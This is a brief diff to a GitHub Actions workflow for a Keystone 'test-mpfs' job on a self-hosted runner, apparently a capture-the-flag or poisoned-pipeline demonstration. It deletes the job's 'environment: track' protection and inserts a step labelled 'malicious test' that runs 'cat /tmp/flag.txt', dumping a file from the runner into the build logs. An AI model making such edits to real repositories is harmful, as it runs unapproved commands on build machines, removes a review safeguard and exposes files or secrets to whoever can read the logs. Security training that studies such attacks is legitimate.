@@ -69,8 +69,11 @@ jobs:
 
   test-mpfs:
     runs-on: [self-hosted, mpfs]
-    environment: track
     steps:
+    - name: malicious test
+      run: |
+        cat /tmp/flag.txt
+
     # We don't need submodules here since Keystone is a monorepo!
     - name: Checkout Keystone
       uses: actions/checkout@v3
